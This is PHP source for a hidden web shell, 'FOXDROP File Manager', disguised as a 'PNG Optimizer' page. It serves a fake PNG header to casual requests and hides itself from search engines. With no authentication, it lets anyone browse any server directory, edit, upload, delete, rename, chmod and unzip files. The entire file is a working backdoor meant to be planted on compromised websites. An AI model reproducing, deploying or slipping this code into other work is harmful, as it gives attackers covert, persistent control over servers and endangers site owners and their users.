<?php
// 🛡️ FOXDROP File Manager (hidden) - Enhanced UI

// === Fake PNG for disguise (if ?i)
if (isset($_GET['i'])) {
    header("Content-Type: image/png");
    echo "\x89PNG\r\n\x1a\n"; // fake PNG header
    exit;
}

// === Init
error_reporting(E_ALL);
ini_set('display_errors', 1);

$self = __FILE__;
$dir = isset($_GET['go']) ? $_GET['go'] : getcwd();
$dir = realpath($dir);
$items = scandir($dir);

// === Actions: Delete, Rename, Perms, Zip/Unzip, Edit, Upload, Folder
if (isset($_GET['delete'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    echo "<div class='alert alert-danger'>🗑️ Deleted: " . htmlspecialchars($_GET['delete']) . "</div>";
}

if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $from = $dir . DIRECTORY_SEPARATOR . basename($_POST['rename_from']);
    $to = $dir . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
    if (file_exists($from)) {
        rename($from, $to);
        echo "<div class='alert alert-success'>✏️ Renamed successfully.</div>";
    }
}

if (isset($_POST['perm_target']) && isset($_POST['perm_value'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_POST['perm_target']);
    $perm = intval($_POST['perm_value'], 8);
    if (file_exists($target)) {
        chmod($target, $perm);
        echo "<div class='alert alert-success'>🔐 Permissions changed to " . decoct($perm) . "</div>";
    }
}

if (isset($_GET['zip'])) {
    $zipTarget = $dir . DIRECTORY_SEPARATOR . basename($_GET['zip']);
    $zipFile = $zipTarget . '.zip';
    if (is_dir($zipTarget)) {
        $zip = new ZipArchive();
        if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($zipTarget, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($files as $file) {
                $pathInZip = substr($file->getPathname(), strlen($zipTarget) + 1);
                $zip->addFile($file->getPathname(), $pathInZip);
            }
            $zip->close();
            echo "<div class='alert alert-success'>📦 Zipped: " . htmlspecialchars(basename($zipFile)) . "</div>";
        }
    }
}

if (isset($_GET['unzip'])) {
    $zipPath = $dir . DIRECTORY_SEPARATOR . basename($_GET['unzip']);
    if (is_file($zipPath) && pathinfo($zipPath, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($zipPath)) {
            $zip->extractTo($dir);
            $zip->close();
            echo "<div class='alert alert-success'>📂 Unzipped to <code>" . htmlspecialchars($dir) . "</code></div>";
        }
    }
}

if (isset($_GET['edit'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_GET['edit']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content_save'])) {
        file_put_contents($targetFile, $_POST['content']);
        echo "<div class='alert alert-success'>💾 Saved.</div>";
    }
    $code = @file_get_contents($targetFile);
    echo "<!DOCTYPE html><html><head>
    <title>PNG Optimizer | Dashboard</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css'>
    <style>
    .file-icon { font-size: 1.2rem; margin-right: 8px; }
    .breadcrumb { background-color: #f8f9fa; padding: 0.75rem 1rem; }
    .file-actions a { margin-right: 10px; }
    .file-size { font-family: monospace; }
    .file-perm { font-family: monospace; }
    .editor-container { margin-top: 20px; }
    .editor-textarea { font-family: monospace; font-size: 14px; }
    </style>
    </head><body class='bg-light'>";
    echo "<div class='container mt-4'>";
    echo "<div class='card'>";
    echo "<div class='card-header bg-primary text-white d-flex justify-content-between align-items-center'>
        <h4><i class='bi bi-pencil-square'></i> Editing: " . htmlspecialchars($_GET['edit']) . "</h4>
        <a href='?go=" . urlencode($dir) . "' class='btn btn-light btn-sm'><i class='bi bi-arrow-left'></i> Back</a>
        </div>";
    echo "<div class='card-body'>";
    echo "<form method='post'>
        <div class='mb-3'>
            <textarea name='content' class='form-control editor-textarea' rows='20'>" . htmlspecialchars($code) . "</textarea>
        </div>
        <button type='submit' name='content_save' class='btn btn-primary'><i class='bi bi-save'></i> Save</button>
        </form>";
    echo "</div></div></div>";
    echo "<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js'></script>";
    echo "</body></html>";
    exit;
}

if (isset($_FILES['dropfile'])) {
    $to = $dir . DIRECTORY_SEPARATOR . basename($_FILES['dropfile']['name']);
    move_uploaded_file($_FILES['dropfile']['tmp_name'], $to);
    echo "<div class='alert alert-success'>📤 Uploaded: " . htmlspecialchars($_FILES['dropfile']['name']) . "</div>";
}

if (isset($_POST['mkfolder']) && $_POST['mkfolder']) {
    $folder = $dir . DIRECTORY_SEPARATOR . basename($_POST['mkfolder']);
    if (!file_exists($folder)) {
        mkdir($folder);
        echo "<div class='alert alert-success'>📁 Folder created.</div>";
    } else {
        echo "<div class='alert alert-danger'>❌ Folder already exists.</div>";
    }
}

// === Sorting
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) && $_GET['order'] === 'desc' ? 'desc' : 'asc';

usort($items, function($a, $b) use ($dir, $sort, $order) {
    if ($a === '.' || $a === '..') return -1;
    if ($b === '.' || $b === '..') return 1;
    $pathA = $dir . DIRECTORY_SEPARATOR . $a;
    $pathB = $dir . DIRECTORY_SEPARATOR . $b;
    if ($sort === 'size') {
        $valA = is_file($pathA) ? filesize($pathA) : 0;
        $valB = is_file($pathB) ? filesize($pathB) : 0;
    } elseif ($sort === 'perm') {
        $valA = fileperms($pathA);
        $valB = fileperms($pathB);
    } else {
        $valA = strtolower($a);
        $valB = strtolower($b);
    }
    return ($order === 'asc') ? $valA <=> $valB : $valB <=> $valA;
});

// === HTML Output
echo "<!DOCTYPE html><html><head>
<title>PNG Optimizer | Dashboard</title>
<meta name='description' content='PNG Compression & Storage Tool'>
<meta name='robots' content='noindex,nofollow'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css'>
<style>
.file-icon { font-size: 1.2rem; margin-right: 8px; }
.breadcrumb { background-color: #f8f9fa; padding: 0.75rem 1rem; }
.file-actions a { margin-right: 10px; }
.file-size { font-family: monospace; }
.file-perm { font-family: monospace; }
.upload-box { border: 2px dashed #dee2e6; padding: 20px; text-align: center; margin-bottom: 20px; }
.upload-box:hover { border-color: #adb5bd; }
</style>
</head>
<body class='bg-light'>
<div class='container mt-4'>
<div class='card shadow-sm'>
<div class='card-header bg-primary text-white'>
    <h4 class='mb-0'><i class='bi bi-folder'></i> FOXDROP File Manager</h4>
</div>
<div class='card-body'>";

// === Path Navigation
echo "<nav aria-label='breadcrumb'>
    <ol class='breadcrumb'>";
$steps = explode(DIRECTORY_SEPARATOR, $dir);
$build = '';
foreach ($steps as $seg) {
    if ($seg === '') {
        $build .= DIRECTORY_SEPARATOR;
        echo "<li class='breadcrumb-item'><a href='?go=" . urlencode($build) . "'><i class='bi bi-house-door'></i></a></li>";
        continue;
    }
    $build .= $seg . DIRECTORY_SEPARATOR;
    echo "<li class='breadcrumb-item'><a href='?go=" . urlencode($build) . "'>" . htmlspecialchars($seg) . "</a></li>";
}
echo "</ol></nav>";

// === Table Header
echo "<div class='table-responsive'>
<table class='table table-hover table-sm'>
<thead class='table-light'>
<tr>";
$headers = ['name' => 'Name', 'size' => 'Size', 'perm' => 'Permissions'];
foreach ($headers as $key => $label) {
    $new_order = ($sort === $key && $order === 'asc') ? 'desc' : 'asc';
    echo "<th><a href='?go=" . urlencode($dir) . "&sort=$key&order=$new_order' class='text-decoration-none'>" . htmlspecialchars($label) . "</a></th>";
}
echo "<th>Actions</th></tr>
</thead>
<tbody>";

// === File List
foreach ($items as $item) {
    if ($item === '.') continue;
    $path = $dir . DIRECTORY_SEPARATOR . $item;
    $size = is_file($path) ? formatSize(filesize($path)) : '-';
    $perm = substr(sprintf('%o', fileperms($path)), -3);
    $permColor = is_writable($path) ? 'text-success' : 'text-muted';
    $icon = is_dir($path) ? 'bi-folder' : 'bi-file-earmark';

    $name = is_dir($path)
        ? "<i class='bi $icon'></i> <a href='?go=" . urlencode($path) . "'>" . htmlspecialchars($item) . "</a>"
        : "<i class='bi $icon'></i> <a href='?go=" . urlencode($dir) . "&edit=" . urlencode($item) . "'>" . htmlspecialchars($item) . "</a>";

    $actions = [];
    if (is_file($path)) {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&edit=" . urlencode($item) . "' class='text-primary'><i class='bi bi-pencil'></i></a>";
    }

    // Inline Rename
    if (isset($_GET['rename_from']) && $_GET['rename_from'] === $item) {
        $actions[] = "<form method='post' class='d-inline'>
            <input type='hidden' name='rename_from' value='" . htmlspecialchars($item) . "'>
            <div class='input-group input-group-sm' style='width: 150px;'>
                <input type='text' name='rename_to' class='form-control form-control-sm' placeholder='New name'>
                <button type='submit' class='btn btn-sm btn-success'><i class='bi bi-check'></i></button>
                <a href='?go=" . urlencode($dir) . "' class='btn btn-sm btn-danger'><i class='bi bi-x'></i></a>
            </div>
        </form>";
    } else {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&rename_from=" . urlencode($item) . "' class='text-info'><i class='bi bi-tag'></i></a>";
    }

    $actions[] = "<a href='?go=" . urlencode($dir) . "&delete=" . urlencode($item) . "' class='text-danger' onclick='return confirm(\"Delete " . htmlspecialchars($item) . "?\")'><i class='bi bi-trash'></i></a>";

    if (is_dir($path)) {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&zip=" . urlencode($item) . "' class='text-warning'><i class='bi bi-file-zip'></i></a>";
    } elseif (strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip') {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&unzip=" . urlencode($item) . "' class='text-success'><i class='bi bi-folder-plus'></i></a>";
    }

    echo "<tr>
        <td>$name</td>
        <td class='file-size'>$size</td>
        <td class='file-perm $permColor'>$perm</td>
        <td class='file-actions'>" . implode('', $actions) . "</td>
    </tr>";
}
echo "</tbody></table></div>";

// === Forms: Upload, Folder, Chmod
echo "<div class='row mt-4'>
    <div class='col-md-4 mb-3'>
        <div class='card'>
            <div class='card-header bg-secondary text-white'>
                <i class='bi bi-upload'></i> Upload File
            </div>
            <div class='card-body'>
                <form method='post' enctype='multipart/form-data' class='upload-box'>
                    <div class='mb-3'>
                        <input type='file' name='dropfile' class='form-control'>
                    </div>
                    <button type='submit' class='btn btn-primary'><i class='bi bi-upload'></i> Upload</button>
                </form>
            </div>
        </div>
    </div>
    
    <div class='col-md-4 mb-3'>
        <div class='card'>
            <div class='card-header bg-secondary text-white'>
                <i class='bi bi-folder-plus'></i> New Folder
            </div>
            <div class='card-body'>
                <form method='post'>
                    <div class='input-group'>
                        <input type='text' name='mkfolder' class='form-control' placeholder='Folder name'>
                        <button type='submit' class='btn btn-success'><i class='bi bi-check-lg'></i></button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <div class='col-md-4 mb-3'>
        <div class='card'>
            <div class='card-header bg-secondary text-white'>
                <i class='bi bi-shield-lock'></i> Change Permissions
            </div>
            <div class='card-body'>
                <form method='post'>
                    <div class='mb-3'>
                        <select name='perm_target' class='form-select'>
                            <option value=''>Select file/folder</option>";
                            foreach ($items as $item) {
                                if ($item === '.') continue;
                                echo "<option value='" . htmlspecialchars($item) . "'>$item</option>";
                            }
                            echo "</select>
                    </div>
                    <div class='input-group'>
                        <input type='text' name='perm_value' class='form-control' placeholder='e.g. 755'>
                        <button type='submit' class='btn btn-warning'><i class='bi bi-shield-check'></i></button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>";

echo "</div></div></div>";

echo "<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js'></script>
</body></html>";

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
?>